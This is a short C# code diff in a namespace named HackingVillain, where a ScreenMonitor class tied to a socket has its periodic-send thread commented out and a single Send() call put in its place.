@@ -20,7 +20,7 @@ namespace HackingVillain
         {
             _client = sock;
 
-            t = new Thread(() =>
+            /*t = new Thread(() =>
             {
                 while(true)
                 {
@@ -28,6 +28,8 @@ namespace HackingVillain
                     Thread.Sleep(1000);
                 }
             });
+            */
+            Send();
         }
 
         ~ScreenMonitor()
